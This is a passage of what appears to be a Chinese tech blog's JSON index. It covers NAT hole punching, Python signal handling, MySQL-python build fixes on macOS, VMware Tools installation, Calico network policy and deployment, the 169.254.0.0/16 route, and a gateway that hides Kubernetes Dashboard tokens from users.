NAT 设备的扩展。\n打洞 Hole Punching 打洞（Hole Punching）是可以使NAT 后面的两个网络设备通过让另一个设备知道它们的私有断定与公共端点之间的映射信息来相互联系。 因此，它属于基于的NAT打洞机制。 必要条件是需要存在一个第三方网络设备，该设备可以获得两设备间的信息，并进行信息交换的服务器。 Hole Puching的工作原理如下:\nHost A 和 Host B 都向Host C(中继器) 发送 UDP 数据包。当数据包通过它们的 NAT 时，NAT 将源 IP 地址重写为其公网可访问的 IP 地址。它也可能重写源端口号，在这种情况下，UDP 打孔几乎是不可能的。 C 记录来自 Host A 和Host B 的传请求的 IP 与端口。 C 将两者（Host A、B）信息交换 （告诉A B的IP端口，告诉B A的IP端口） Host A 和Host B 的第一个数据包在进入彼此的 NAT设备 时被拒绝。然而，当数据包从 A 的 NAT 在端口X传递到 B 的 NAT 时，NAT A 注意到了它，因此在其防火墙上打了一个洞，以允许来自 B 的 NAT 的 IP 的传入数据包，从端口 X . B 的 NAT 也会发生同样的情况，它制定了一个规则，允许来自 A 的 NAT 的 IP 地址的数据包从端口 Y传入。 完成时，当 Host A 和 Host B 相互发送数据包时，此时会被接受，即完成了P2P网络。 Reference 打洞\nP2P技术详解(三)：P2P中的NAT穿越(打洞)方案详解(进阶分析篇)\n","permalink":"https://www.oomkill.com/2021/06/understand-hole-punchine-mechnism/","summary":"","title":"P2P打洞技术"},{"content":"什么是信号 信号（signal）\u0026ndash; 进程间通讯的一种方式，也可作为一种软件中断的方法。一个进程一旦接收到信号就会打断原来的程序执行来按照信号进行处理。\n简化术语，信号是一个事件，用于中断运行功能的执行。信号始终在主Python线程中执行。对于信号，这里不做详细介绍。\nPython封装了操作系统的信号功能的库 singal 的库。singal 库可以使我们在python程序中中实现信号机制。\nhttps://zh.wikipedia.org/wiki/Unix%E4%BF%A1%E5%8F%B7)\nPython的信号处理 首先需要了解Python为什么要提供 signal Library。信号库使我们能够使用信号处理程序，以便当接收信号时都可以执行自定义任务。\nMission：当接收到信号时执行信号处理方法\n可以通过使用 signal.singal() 函数来实现此功能\nPython对信号的处理 通常情况下Python 信号处理程序总是会在主 Python 主解析器的主线程中执行，即使信号是在另一个线程中接收的。 这意味着信号不能被用作线程间通信的手段。 你可以改用 threading 模块中的同步原语。\nPython信号处理流程，需要对信号处理程序（signal handling ）简要说明。signal handling 是一个任务或程序，当检测到特定信号时，处理函数需要两个参数，即信号id signal number （Linux 中 1-64），与堆栈帧 frame。通过相应信号启动对应 signal handling ，signal.signal() 将为信号分配 处理函数。\n如：当运行一个脚本时，取消，此时是捕获到一个信号，可以通过捕获信号方式对程序进行异步的优雅处理。通过将信号处理程序注册到应用程序中：\nimport signal import time def handler(a, b): # 定义一个signal handling\rprint(\u0026quot;Signal Number:\u0026quot;, a, \u0026quot; Frame: \u0026quot;, b) signal.signal(signal.SIGINT, handler) # 将handle分配给对应信号\rwhile True: print(\u0026quot;Press ctrl + c\u0026quot;)\rtime.sleep(10) 如果不对对应信号进行捕获处理时，python将会抛出异常。\n$ python signal.py\r^CTraceback (most recent call last):\rFile \u0026quot;signal.py\u0026quot;, line 3, in \u0026lt;module\u0026gt;\rwhile True:\rKeyboardInterrupt\r信号枚举 信号的表现为一个int，Python的信号库有对应的信号枚举成员\n其中常用的一般有，\nSIGINT control+c\nSIGTERM 终止进程 软件终止信号\nSIGKILL 终止进程 杀死进程\nSIGALRM 超时\n信号 说明 SIG_DFL SIG_IGN 标准信号处理程序，它将简单地忽略给定的信号 SIGABRT SIGIOT 来自 abort 的中止信号。\nabort 导致异常进程终止。通常由检测内部错误或严重破坏约束的库函数调用。例如，如果堆的内部结构被堆溢出损坏，malloc()将调用abort() SIGALRMSIGVTALRM SIGPROF 如果你用 setitimer 这一类的报警设置函数设置了一个时限，到达时限时进程会接收到 SIGALRM, SIGVTALRM 或者 SIGPROF。但是这三个信号量的含义各有不同，SIGALRM 计时的是真实时间，SIGVTALRM计时的是进程使用了多少CPU时间，而 SIGPROF 计时的是进程和代表该进程的内核用了多少时间。 SIGBUS 总线发生错误时，进程接收到一个SIGBUS信号。举例来说，存储器访问对齐或者或不存在对应的物理地址都会产生SIGBUS信号。 SIGCHLD 当子进程终止、被中断或被中断后恢复时，SIGCHLD信号被发送到进程。该信号的一个常见用法是指示操作系统在子进程终止后清理其使用的资源，而不显式调用等待系统调用。 SIGILL 非法指令。当进程试图执行非法、格式错误、未知或特权指令时，SIGILL信号被发送到该进程。 SIGKILL 发送SIGKILL信号到一个进程可以使其立即终止(KILL)。与SIGTERM和SIGINT相不同的是，这个信号不能被捕获或忽略，接收过程在接收到这个信号时不能执行任何清理。 以下例外情况适用: SIGINT 来自键盘的中断 (CTRL + C)。KeyboardInterrupt SIGPIPE 当一个进程试图写入一个没有连接到另一端进程的管道时，SIGPIPE信号会被发送到该进程。 **SIGTERM ** 终结信号。 KILL -15 |KILL SIGUSR1\nSIGUSR2 用户自定义信号 SIGWINCH 终端窗口大小已变化 SIGHUP 在控制终端上检测到挂起或控制进程的终止。 Reference：[signal-wikipedia](\n信号函数 Python的信号库中也有很多常用的函数\nsignal.alarm(time) 创建一个 SIGALRM 类型的信号，time为预定的时间，设置为0时取消先前设置的定时器\nsignal.pause() 可以使代码逻辑处理过程睡眠，直到收到信号，然后调用对应的handler。\nimport signal\rimport os\rimport time\rdef do_exit(sig, stack):\rraise SystemExit('Exiting')\rsignal.signal(signal.SIGINT, signal.SIG_IGN)\rsignal.signal(signal.SIGUSR1, do_exit)\rprint('My PID:', os.getpid())\rsignal.pause()\r在执行时，忽略了ctrl + c的信号，对USR1做退出操作\nsignal.setitimer(which, seconds, interval) which： signal.ITIMER_REAL，signal.ITIMER_VIRTUAL 或 signal.ITIMER_PROF\nseconds：多少秒后触发which。seconds设置为0可以清除which的计时器。\ninterval：每隔interval秒后触发一次\nos.getpid() 获得当前执行程序的pid\nWindows下信号的使用 在Linux中，可以通过任何可接受的信号枚举值作为信号函数的参数。在Windows中，SIGABRT, SIGFPE, SIGINT, SIGILL, SIGSEGV, SIGTERM, SIGBREAK。\n当signal handling需要参数怎么办 在一些时候，signal handling的操作需要对应主进程传递进来一些函数，而在整个项目中执行过程中的变量与 signal handling不处于一个作用域中，而signal.signal() 不能传递其他的参数，这个时候可以使用 partial 创建一个闭包来解决这个问题。\n例如：\nimport signal\rimport os\rimport sys\rimport time\rfrom functools import partial\r\u0026quot;\u0026quot;\u0026quot;\r这里signal frame默认参数需要放到最后\r\u0026quot;\u0026quot;\u0026quot;\rdef signal_handler(test_parameter1, test_parameter2, signal_num, frame):\rprint \u0026quot;signal {} exit. {} {}\u0026quot;.format(signal_num, test_parameter1, test_parameter2)\rsys.exit(1)\ra=1\rb=2\rsignal.signal(signal.SIGINT, partial(signal_handler, a, b) )\rprint('My PID:', os.getpid())\rsignal.pause()\r忽略信号 signal定义了忽略接收信号的方法。为了实现信号的处理，需要使用signal.signal() 将默认的信号与signal.SIG_IGN 注册，即可忽略对应的信号中断，kill -9 不可忽略 。\nimport signal\rimport os\rimport time\rdef receiveSignal(signalNumber, frame):\rprint('Received:', signalNumber)\rraise SystemExit('Exiting')\rreturn\rif __name__ == '__main__':\r# register the signal to be caught\rsignal.signal(signal.SIGUSR1, receiveSignal)\r# register the signal to be ignored\rsignal.signal(signal.SIGINT, signal.SIG_IGN)\r# output current process id\rprint('My PID is:', os.getpid())\rsignal.pause()\r常用的信号 import signal\rimport os\rimport time\rimport sys\rdef readConfiguration(signalNumber, frame):\rprint ('(SIGHUP) reading configuration')\rreturn\rdef terminateProcess(signalNumber, frame):\rprint ('(SIGTERM) terminating the process')\rsys.exit()\rdef receiveSignal(signalNumber, frame):\rprint('Received:', signalNumber)\rreturn\rsignal.signal(signal.SIGHUP, readConfiguration)\rsignal.signal(signal.SIGINT, receiveSignal)\rsignal.signal(signal.SIGQUIT, receiveSignal)\rsignal.signal(signal.SIGILL, receiveSignal)\rsignal.signal(signal.SIGTRAP, receiveSignal)\rsignal.signal(signal.SIGABRT, receiveSignal)\rsignal.signal(signal.SIGBUS, receiveSignal)\rsignal.signal(signal.SIGFPE, receiveSignal)\r#signal.signal(signal.SIGKILL, receiveSignal)\rsignal.signal(signal.SIGUSR1, receiveSignal)\rsignal.signal(signal.SIGSEGV, receiveSignal)\rsignal.signal(signal.SIGUSR2, receiveSignal)\rsignal.signal(signal.SIGPIPE, receiveSignal)\rsignal.signal(signal.SIGALRM, receiveSignal)\rsignal.signal(signal.SIGTERM, terminateProcess)\r","permalink":"https://www.oomkill.com/2021/06/python-signal-handle/","summary":"","title":"python中的signal"},{"content":"记录一下，接了一个python2 django1.x的项目，很老了导致很多扩展无法安装\nos version：macos catalina python version: 2.7.18\n而django后端使用sqllite以外需要对应客户端引擎，而安装时编译依赖C客户端即实际mysql组件。\n使用的数据库后端。 内建的数据库后端有：\n\u0026lsquo;django.db.backends.postgresql\u0026rsquo; \u0026lsquo;django.db.backends.mysql\u0026rsquo; \u0026lsquo;django.db.backends.sqlite3\u0026rsquo; \u0026lsquo;django.db.backends.oracle\u0026rsquo;\n并且修改配置实例\nDATABASES = { 'default': { 'ENGINE': 'django.db.backends.mysql', 'USER': 'mydatabaseuser', 'NAME': 'mydatabase', 'TEST': { 'NAME': 'mytestdatabase', }, }, } brew unlink mysql\nerror: command \u0026lsquo;gcc\u0026rsquo; failed with exit status 1 creating build/temp.macosx-10.9-x86_64-2.7 gcc -fno-strict-aliasing -fno-common -dynamic -arch x86_64 -g -DNDEBUG -g -fwrapv -O3 -Wall -Wstrict-prototypes -Dversion_info=(1,2,5,'final',1) -D__version__=1.2.5 -I/usr/local/Cellar/mysql@5.7/5.7.32/include/mysql -I/Library/Frameworks/Python.framework/Versions/2.7/include/python2.7 -c _mysql.c -o build/temp.macosx-10.9-x86_64-2.7/_mysql.o gcc -bundle -undefined dynamic_lookup -arch x86_64 -g build/temp.macosx-10.9-x86_64-2.7/_mysql.o -L/usr/local/Cellar/mysql@5.7/5.7.32/lib -lmysqlclient -lssl -lcrypto -o build/lib.macosx-10.9-x86_64-2.7/_mysql.so ld: library not found for -lssl clang: error: linker command failed with exit code 1 (use -v to see invocation) error: command 'gcc' failed with exit status 1 解决方法：\n# Required for mysqlclient, see brew info openssl echo 'export PATH=\u0026quot;/usr/local/opt/openssl/bin:$PATH\u0026quot;' \u0026gt;\u0026gt; ~/.bash_profile export LDFLAGS=\u0026quot;-L/usr/local/opt/openssl/lib\u0026quot; export CPPFLAGS=\u0026quot;-I/usr/local/opt/openssl/include\u0026quot; pip install MySQL-python Reference：not-found-for-lssl\nwindows安装\npip install mysqlclient-1.3.12-cp36-cp36m-win_amd64.whl Reference https://www.lfd.uci.edu/~gohlke/pythonlibs/\nubuntu安装\napt-get install libmysqld-dev pip install MySQL-python my_config.h file not found creating build/temp.macosx-10.9-x86_64-2.7 gcc -fno-strict-aliasing -fno-common -dynamic -arch x86_64 -g -DNDEBUG -g -fwrapv -O3 -Wall -Wstrict-prototypes -Dversion_info=(1,2,5,'final',1) -D__version__=1.2.5 -I/usr/local/Cellar/mysql/8.0.23_1/include/mysql -I/Library/Frameworks/Python.framework/Versions/2.7/include/python2.7 -c _mysql.c -o build/temp.macosx-10.9-x86_64-2.7/_mysql.o _mysql.c:44:10: fatal error: 'my_config.h' file not found #include \u0026quot;my_config.h\u0026quot; ^~~~~~~~~~~~~ 1 error generated. error: command 'gcc' failed with exit status 1 解决：网上找了很多版本均无法解决，最后发现实际上与linux处理思路是一样的。\nbrew install mysql # 可以加版本 如 brew install mysq@5.7 brew unlink mysql brew install mysql-connector-c # 这个是客户端 ln -snvf /usr/local/Cellar/mysql\\@5.7/5.7.32/bin/mysql_config /usr/local/bin/ # 做个软连接，位置可能不一致 sed -i -e 's/libs=\u0026quot;$libs -l \u0026quot;/libs=\u0026quot;$libs -lmysqlclient -lssl -lcrypto\u0026quot;/g' /usr/local/bin/mysql_config pip install MySQL-python sh: mysql_config: command not found sh: mysql_config: command not found 这个与上面类似，可以看到也是在PATH中找mysql_config\n","permalink":"https://www.oomkill.com/2021/04/mac-mysqlapi/","summary":"","title":"macos python安装mysqlapi集合"},{"content":"VMware Tools描述 VMware Tools 中包含一系列服务和模块，可在 VMware 产品中实现多种功能，从而使用户能够更好地管理客户机操作系统，以及与客户机系统进行无缝交互。\n在Linux虚拟机中安装VMware Tools 安装前准备\n虚拟机必须打开cd/dvd驱动器，否则安装VMware Tools的选项无法选择 VMware Tools安装程序是使用Perl编写的，必须确认操作系统中安装Perl。 安装步骤\n在虚拟机菜单中右键单击虚拟机，然后单击客户机 \u0026gt; 安装/升级 VMware Tools。\n要创建一个挂载点 mkdir /mnt/cdrom\n要装载 CDROM，mount /dev/cdrom /mnt/cdrom\n要将安装文件文件复制到临时目录：cp /mnt/cdrom/VMwareTools*.tar.gz /tmp/；其中，* 部分是 VMware Tools 软件包的版本号，故以替代*。\n解压文件：cd /tmp \u0026amp;\u0026amp; tar -zxvf VMwareTools*.tar.gz\n运行PERL脚本以安装VMware Tools：cd vmware-tools-distrib \u0026amp;\u0026amp; ./vmware-install.pl，若要求选择，一路回车即可。\n安装完成后清理 rm -fr {/tmp/VMwareTools*,/tmp/vmware-tools-distrib} ; yum remove perl -y，如不需要perl可以卸载\n命令集合\nmkdir /mnt/cdrom\rmount /dev/cdrom /mnt/cdrom\rcp /mnt/cdrom/VMwareTools*.tar.gz /tmp/\rcd /tmp \u0026amp;\u0026amp; tar -xf VMwareTools*.tar.gz\rcd vmware-tools-distrib \u0026amp;\u0026amp; ./vmware-install.pl\r安装后清理\nrm -fr {/tmp/VMwareTools*,/tmp/vmware-tools-distrib}\ryum remove perl -y # 选择性执行\rVMware Tools服务 VMware Tools守护进程在后台运行。它在 Windows 客户机操作系统中名为 vmtoolsd.exe，在 Mac OS X 客户机操作系统中名为 vmware-tools-daemon，在 Linux、FreeBSD 和 Solaris 客户机操作系统中名为 vmtoolsd。\n安装完成后，VMware Tools守护进程并未开机启动，可以设置开机启动，该守护进程在主机和客户机操作系统之间传递信息。\nsystemctl enable vmtoolsd\rsystemctl start vmtoolsd systemctl status vmtoolsd\r配置虚拟机与宿主机系统之间的时间同步 启用时间同步时，VMware Tools会将虚拟机操作系统的时间设置为与宿主机的时间相同。\n注意：无论 VMware Tools时间同步是否打开，在执行以下操作后都会进行时间同步：\n当启动 VMware Tools守护进程时，例如重新引导或打开电源操作过程中。 在从某个挂起操作恢复虚拟机时 恢复到快照后 压缩磁盘后 命令\n操作系统 程序名称 Windows VMwareToolboxCmd.exe Linux、Solaris 和 FreeBSD vmware-toolbox-cmd MAC OS X vmware-tools-cli vmware-toolbox-cmd timesync enable|disable\rReference 配置客户机与主机操作系统之间的时间同步\n在 Linux 虚拟机中安装 VMware Tools (1018414)\nVMware Tools 产品文档\n","permalink":"https://www.oomkill.com/2021/02/vmvaretool/","summary":"","title":"Linux VMware Tools详解"},{"content":"什么是网络策略 在Kubernetes平台中，要实现零信任网络的安全架构，Calico与istio是在Kubernetes集群中构建零信任网络必不可少的组件。\n而建立和维护整个集群中的“零信任网络”中，网络策略的功能在操作上大致可以总结为使用资源配置模板来管理控制平面数据流。说白了讲网络策略就是用来控制Pod间流量的规则。\n在Calico中如何编写网络策略 要使用网络策略就需要先了解Calico功能**：NetworkPolicy和GlobalNetworkPolicy**。\nNetworkPolicy资源，简称np；是命名空间级别资源。规则应用于与标签选择器匹配的endpoint的集合。\nGlobalNetworkPolicy资源，简称 gnp/gnps与NetworkPolicy功能一样，是整个集群级别的资源。\nGlobalNetworkPolicy 与 NetworkPolicy资源的管理也与calico的部署方式有关，使用etcd作为存储时，资源的管理只能使用 calicoctl进行管理\nNetworkPolicy与GlobalNetworkPolicy的构成 apiVersion: projectcalico.org/v3\rkind: NetworkPolicy\rmetadata:\rname: allow-tcp-90\rspec:\rselector: app == 'envoy' # 应用此策略的endpoint\rtypes: # 应用策略的流量方向\r- Ingress - Egress\ringress: # 入口的流量规则\r- action: Allow # 流量的行为\rprotocol: ICMP # 流量的协议\rnotProtocol: TCP # 匹配流量协议不为 值 的流量 source: # 流量的来源 src与dst的匹配关系为 与，所有的都生效即生效\rnets: # 有效的来源IP\rselector: # 标签选择器\rnamespaceSelector: # 名称空间选择器\rports: # 端口\r- 80 # 单独端口\r- 6040:6050\t# 端口范围\rdestination: # 流量的目标\regress: # 出口的流量规则\r- action: Allow\rserviceAccountSelector: # 使用与此规则的serviceAccount\rNetworkPolicy使用 实例：允许6379流量可以被 role=frontend的pod访问\napiVersion: projectcalico.org/v3\rkind: NetworkPolicy\rmetadata:\rname: allow-tcp-6379\rnamespace: production\rspec:\rselector: role == 'database'\rtypes:\r- Ingress\r- Egress\ringress:\r- action: Allow\rmetadata:\rannotations:\rfrom: frontend\rto: database\rprotocol: TCP\rsource:\rselector: role == 'frontend'\rdestination:\rports:\r- 6379\regress:\r- action: Allow\r实例：禁止ICMP流量\napiVersion: projectcalico.org/v3\rkind: NetworkPolicy\rmetadata:\rname: allow-tcp-90\rspec:\rselector: app == 'netbox'\rtypes:\r- Ingress\r- Egress\ringress:\r- action: Deny\rprotocol: ICMP\regress:\r- action: Deny\rprotocol: ICMP\r实例：禁止访问指定服务\napiVersion: projectcalico.org/v3\rkind: NetworkPolicy\rmetadata:\rname: allow-tcp-90\rspec:\rselector: app == 'netbox'\rtypes:\r- Ingress\r- Egress\ringress:\r- action: Allow\regress:\r- action: Deny\rdestination:\rselector: app == 'envoy'\rGlobalNetworkPolicy GlobalNetworkPolicy与NetworkPolicy使用方法基本一致，只是作用域的不同，并且可以应用很多高级的网络策略：\n转发流量 防御DoS \u0026hellip;. GlobalNetworkPolicy 中提供了一个preDNAT的功能，是kube-proxy对Node port的端口和IP的流量DNAT到所对应的Pod中的时候，为了既允许正常的ingress流量，又拒绝其他的ingress流量，这个时候必须要在DNAT前生效，这种情况需要使用preDNAT。\npreDNAT 适用的条件是，流量仅为ingress并且在DNAT之前。\nReference NetworkPolicy.spec\nNetworkPolicy.spec.ingress|egress\nNetworkPolicy.spec.ingress.src|dst\nglobalnetworkpolicy\n","permalink":"https://www.oomkill.com/2021/02/calico-network-policy/","summary":"","title":"calico网络策略"},{"content":"开始前准备 确定calico数据存储\nCalico同时支持kubernetes api和etcd数据存储。官方给出的建议是在本地部署中使用K8S API，仅支持Kubernetes模式。而官方给出的etcd则是混合部署（Calico作为Kubernetes和OpenStack的网络插件运行）的最佳数据存储。\n使用etcd作为calico数据存储的好处：\n允许多平台混用calico，如Kubernetes OpenStack上运行Calico Kubernetes资源与Calico资源分离 一个Calico群集，该群集不仅仅包含一个Kubernetes群集，如可与多个kubernetes集群互通。 坏处：\n安装步骤繁琐 无法使用Kubernetes RBAC对calico资源的控制 无法使用Kubernetes资源对calico进行管理 下载calico部署清单 curl https://docs.projectcalico.org/manifests/calico-etcd.yaml -o calico.yaml 修改Pod CIDR Calico默认的Pod CIDR使用的是192.168.0.0/16，这里一般使用与controller-manager中的--cluster-cidr 保持一,取消资源清单内的 CALICO_IPV4POOL_CIDR变量的注释，并将其设置为与所选Pod CIDR相同的值。\ncalico的IP分配范围 Calico IPAM从ipPool分配IP地址。修改Pod的默认IP范围则修改清单calico.yaml中的CALICO_IPV4POOL_CIDR\n配置Calico的 IP in IP 默认情况下，Calico中的IPIP已经禁用，这里使用的v3.17.2 低版本默认会使用IPIP\n要开启IPIP mode则需要修改配置清单内的 CALICO_IPV4POOL_IPIP 环境变量改为 always\n修改secret # Populate the following with etcd TLS configuration if desired, but leave blank if # not using TLS for etcd. # The keys below should be uncommented and the values populated with the base64 # encoded contents of each file that would be associated with the TLS data. # Example command for encoding a file contents: cat \u0026lt;file\u0026gt; | base64 -w 0 # etcd的ca etcd-ca: # 填写上面命令编码后的值 # etcd客户端key etcd-key: # 填写上面命令编码后的值 # etcd客户端访问证书 etcd-cert: # 填写上面命令编码后的值 修改configMap etcd_endpoints: \u0026quot;https://10.0.0.6:2379\u0026quot; # If you're using TLS enabled etcd uncomment the following. # You must also populate the Secret below with these files. etcd_ca: \u0026quot;/calico-secrets/etcd-ca\u0026quot; etcd_cert: \u0026quot;/calico-secrets/etcd-cert\u0026quot; etcd_key: \u0026quot;/calico-secrets/etcd-key\u0026quot; 开始安装 kubectl apply -f calico.yaml 安装出错 /calico-secrets/etcd-cert: permission denied\n2021-02-08 02:15:10.485 [INFO][1] main.go 88: Loaded configuration from environment config=\u0026amp;config.Config{LogLevel:\u0026quot;info\u0026quot;, WorkloadEndpointWorkers:1, ProfileWorkers:1, PolicyWorkers:1, NodeWorkers:1, Kubeconfig:\u0026quot;\u0026quot;, DatastoreType:\u0026quot;etcdv3\u0026quot;} 2021-02-08 02:15:10.485 [FATAL][1] main.go 101: Failed to start error=failed to build Calico client: could not initialize etcdv3 client: open /calico-secrets/etcd-cert: permission denied 找到资源清单内的对应容器（calico-kube-controllers）的配置。在卷装载中设置440将解决此问题\nvolumes: # Mount in the etcd TLS secrets with mode 400. # See https://kubernetes.io/docs/concepts/configuration/secret/ - name: etcd-certs secret: secretName: calico-etcd-secrets defaultMode: 0400 # 改为0440 修改calicoctl的数据源 使用单独的etcd作为calico数据存储还需要修改calicoctl数据存储访问配置\ncalicoctl 在默认情况下，查找配置文件的路径为/etc/calico/calicoctl.cfg上。可以使用--config覆盖此选项默认配置（使用中测试不成功，官方给出有这个方法）。\n如果calicoctl无法获得配置文件，将检查环境变量。\napiVersion: projectcalico.org/v3 kind: CalicoAPIConfig metadata: spec: datastoreType: etcdv3 etcdEndpoints: \u0026quot;https://10.0.0.6:2379\u0026quot; etcdCACert: | # 这里填写etcd ca证书文件的内容，无需转码base64 etcdCert: | # 这里填写etcd client证书文件的内容，无需转码base64 etcdKey: | # 这里填写etcd client秘钥文件的内容，无需转码base64 reference：\nSecret permission denied\nconfiguration calicoctl\ncalico installation\n","permalink":"https://www.oomkill.com/2021/02/calico-deploy-on-hybrid-cloud/","summary":"","title":"基于混合云模式的calico部署"},{"content":"在Linux中，发现每次系统启动时，都会将（169.254.0.0/16）路由启动并将其添加到路由表中。但是并不知道这条路由具有什么功能和它到底来自于哪里？\n$ route -n Kernel IP routing table Destination Gateway Genmask Flags Metric Ref Use Iface 0.0.0.0 10.0.0.2 0.0.0.0 UG 0 0 0 eth0 10.0.0.0 0.0.0.0 255.255.255.0 U 0 0 0 eth0 169.254.0.0 0.0.0.0 255.255.0.0 U 1002 0 0 eth0 要想搞清楚路由（169.254.0.0/16）究竟来自哪里并且它的作用是什么？首先需要搞明白两个概念\nzeroconf “zeroconf”或“Zero Configuration Networking” 是一种无需额外配置即可自动创建IP地址网络的技术。也被称为 “Automatic Private IP Addressing”（APIPA）。\nzeroconf规范的提出者是Apple公司，其目的是让非专业用户也可以便捷的连接各种网络设备，例如计算机，打印机等。整个搭建网络的过程都是自动实现。如果没有“zeroconf”，用户必须手动，或者利用对应的服务（例如DHCP、DNS）对网络进行配置。这些过程对非技术用户和新用户们来说是很一件难的事情。\nzeroconf的出现是问了解决三个问题：\n为网络设备自动分配可用IP地址 解析计算机主机名 自动发现网络服务（如打印机等） zeroconf的地址选用 对于Link-local address，IPv4使用的特殊保留地址169.254.0.0/16，在RFC3927中所描述。作用是当DHCP客户端在超时和重试后扔找不到对应的DHCP服务器，它将随机从该网络(｀169.254.0.0/16｀)中获取地址。这样可以与无法获取DHCP地址的主机进行通信。\n如何禁用zeroconf 要在系统引导期间禁用zeroconf路由，需要编辑/etc/sysconfig/network文件，配置以下内容\nNETWORKING=YES HOSTNAME=localhost.localdomain NOZEROCONF=yes 169.254.0.0/16的应用 在calico中就使用了这个地址169.254.0.0/16\ndefault via 169.254.1.1 dev eth0 169.254.1.1 dev eth0 scope link 这个IP地址169.254.1.1是默认的网关，但是整个网络中中没有一张网卡是这个地址。那么为何是这个地址？\n如一个网络中设备D1 (192.168.0.2/24) 与设备D2 (192.168.1.2/24)，D1和D2在相互通信时，D1先发送了ARP广播，请求D2的mac地址，但是由于两个设备处于不同网，也就是说D1的ARP请求会被R1拦截到，然后R1会封装自己的mac地址为目的地址发送一个ARP回应数据报给R1（善意的欺骗），然后R1就会代替D1去访问D2。\n在Kubernetes Calico网络中，当一个数据包的目的地址不是本网络时，会先发起ARP广播，网关设置即169.254.1.1收到会将自己的mac地址返回给发送端，后续的请求由这个veth对进行完成，使用代理arp做了arp欺骗。这样做抑制了arp广播攻击，并且通过代理arp也可以进行跨网络的访问。\n在容器内可以使用ethtool -S 来查看对端。这里使用的容器为cylon/netbox，集成了常用的网络命令，作为网络故障排除容器使用。\n实验：查找calico网络中169.254.1.1的应用 当从netbox02（10.244.140.69/32） ping netbox01（10.244.241.74/32）发现ARP包被抑制在容器内部，相应的mac地址为eth0的对端\n而后根据路由交有tun0隧道进行IPIP封装，tun0为其隧道，隧道解包后发往对应的设备，而calico网络中会生成路由到对应的workload之上。\nreference\nwiki_zero-configuration-network\n","permalink":"https://www.oomkill.com/2021/02/linux-1692540024/","summary":"","title":"Linux中169.254.0.0/24的路由来自哪里"},{"content":"本文转自博客： 我的小米粥分你一半\n我一直在负责维护的PaaS平台引入了Kubernetes作为底层支持, 可以借助Kubernetes的生态做更多的事情, 这篇博客主要介绍如何为用户提供dashboard功能, 以及一些可以扩展的想法. 希望读者有一定的kubernetes使用经验, 并且了解rbac的功能。\nDashboard功能 Kubernetes原生提供了Web界面, 也就是Dashboard, 具体的参考可以见官方文档:\n​\t安装完成后, 我们一般是通过token来使用的, 不同的token有着不同的权限.\n​\t上面所说的token是Bearer Token, 除了在界面上输入之外, 你可以这么来用, 通过添加header即可.\ncurl -H \u0026quot;Authorization: Bearer ${TOKEN}\u0026quot; https://{dashboard}/api/myresource\rPaaS平台使用Dashboard简要讨论 需求分析 Dashboard本身的功能是十分强大的, 但是给所有人admin权限显然是不现实的. 对于一个普通用户来讲, PaaS平台的将他的应用(代码)部署好并运行, 他所需要关注的就只有属于他自己的项目, 平台也需要做好权限控制, 避免一个用户操作了另一个用户的应用.\n权限系统设计 基于以上的需求讨论, 平台需要做的操作就是为每个用户创建属于自己的权限提供, 并限制可以访问到的资源. 考虑这样的情况:\n我们有一个用户A, 他拥有自己的一个应用群组(G), 群组中部署了一系列应用程序(a1, a2…). 在Kubernetes中, 这样的群组概念我们将其映射为namespace, 群组(G) \u0026lt;=\u0026gt; 用户空间(NS), 我们需要控制的权限控制策略就变成了用户A在用户空间NS的权限控制.\ntoken分发策略 拥有了权限控制后, 所需要打就是将token分发给用户, 当然这是一种极度不安全的做法, Kubernetes中的token创建之后一般是不会改变的, 分发这样的token会有很大的安全风险, 有两个方面:\n1. 用户A将token保存了下来, 那么他就能不经过平台登录Dashboard, 这样不利于审计工作,\r2. token一旦泄露, PaaS平台很难做到反应(因为token脱离了平台的控制, 无法判断究竟是什么时候发生了泄露, 也无法马上吊销这个token), 安全风险比较高.\r因此, 最好的做法就是不把token交给用户, 用户每次想要登录dashboard, 从平台进行跳转, 跳转时携带安全信息, 在dashboard登录时, 由平台自己的程序请求token, 避免经手用户.\n如果到这里, 你没有理解上面的内容, 建议回去再看一次需求, 如果还是理解不了, 就不要往下看了, 下面只是介绍具体的实现方案.\nKubernetes权限限制 Kubernetes本身有着比较复杂的权限控制系统, 设计时没必要纠结过多, 按照可以给用户和不能给用户的权限进行区分就好了. 我直接贴一下我的权限控制策略吧, 并不一定适合每个人, 只是可以做个参考.\n---\rapiVersion: rbac.authorization.k8s.io/v1\rkind: Role\rmetadata:\rname: xxx:xxx-group-yyy\rnamespace: xxx-group-yyy\rrules:\r# 可以查看当前NS下面的service, pod, logs, events\r- apiGroups: [\u0026quot;\u0026quot;]\rresources: [\u0026quot;services\u0026quot;, \u0026quot;pods\u0026quot;, \u0026quot;pods/log\u0026quot;, \u0026quot;events\u0026quot;]\rverbs: [\u0026quot;get\u0026quot;, \u0026quot;list\u0026quot;, \u0026quot;watch\u0026quot;]\r# 可以使用exec命令进入容器\r- apiGroups: [\u0026quot;\u0026quot;]\rresources: [\u0026quot;pods/exec\u0026quot;]\rverbs: [\u0026quot;create\u0026quot;, \u0026quot;list\u0026quot;, \u0026quot;watch\u0026quot;]\r# 可以查看deployments和replicasets\r- apiGroups: [\u0026quot;extensions\u0026quot;, \u0026quot;apps\u0026quot;]\rresources: [\u0026quot;deployments\u0026quot;, \u0026quot;replicasets\u0026quot;]\rverbs: [\u0026quot;get\u0026quot;, \u0026quot;list\u0026quot;, \u0026quot;watch\u0026quot;]\r# 可以查看job, cronjob以及ingress\r- apiGroups: [\u0026quot;batch\u0026quot;, \u0026quot;extensions\u0026quot;]\rresources: [\u0026quot;cronjobs\u0026quot;, \u0026quot;jobs\u0026quot;, \u0026quot;ingresses\u0026quot;]\rverbs: [\u0026quot;get\u0026quot;, \u0026quot;list\u0026quot;, \u0026quot;watch\u0026quot;]\r正如上面的注释一样, 尽可能只给用户只读的权限, 也许你已经发现了, 甚至不需要给用户namespace的查看权限, 这也是为了安全, 避免用户得知其他人的namespace.\n分发Token以及安全性保证 这是本篇博客的核心内容: 如何使得用户可以无感知的登录到dashboard(对用户隐藏token).\n该方案用到的方法是: 添加一层访问控制的网关, 用于处理token获取的操作, 具体的流程图如下.\n需要注意的有几点:\nPaaS给出的secret_code是有时效性的, 不允许用户一直用同一个secret_code进行访问 网关与PaaS平台间的通信应该加密, 网关必须是PaaS平台可信的 网关不应该长期保存token 网关的访问最好添加OpenID校验, 确保网关可以精确定位到每个用户的每次访问 体验优化 首先, 第2步到第3步, secret_code获取之后, 可以以302重定向的方式跳转至网关入口 网关可以临时性的保存secret_code与token的映射关系, 既能够提升用户体验, 也能有效减缓PaaS平台的压力 dashbaord的webshell功能是基于websocket支持的, 所以请确保你的网关可以通过websocket请求, 否则终端连接后几分钟就断了, 